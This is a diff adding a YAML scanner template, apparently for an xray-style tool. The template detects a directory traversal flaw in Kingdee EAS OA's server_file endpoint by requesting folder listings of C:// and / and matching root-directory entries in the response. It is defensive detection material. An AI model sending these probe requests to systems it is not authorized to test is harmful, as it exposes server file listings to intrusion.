@@ -1,0 +1,25 @@
+id: kingdee-eas-directory-traversal
+
+info:
+  name: Kingdee EAS - Local File Inclusion
+  author: ritikchaddha
+  severity: high
+  verified: true
+  description: |
+    Kingdee EAS OA server_file is vulnerable to local file inclusion and can allow attackers to obtain sensitive server information.
+    app="Kingdee-EAS"
+  reference:
+    - https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E8%9D%B6OA%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /appmonitor/protected/selector/server_file/files?folder=C://&suffix=
+    expression: response.status == 200 && (response.body.bcontains(b'{"name":"Windows","path":"C:\\\\Windows","folder":true}') || response.body.bcontains(b'{"name":"root","path":"/root","folder":true}'))
+  r1:
+    request:
+      method: GET
+      path: /appmonitor/protected/selector/server_file/files?folder=/&suffix=
+    expression: response.status == 200 && (response.body.bcontains(b'{"name":"Windows","path":"C:\\\\Windows","folder":true}') || response.body.bcontains(b'{"name":"root","path":"/root","folder":true}'))
+expression: r0() || r1()
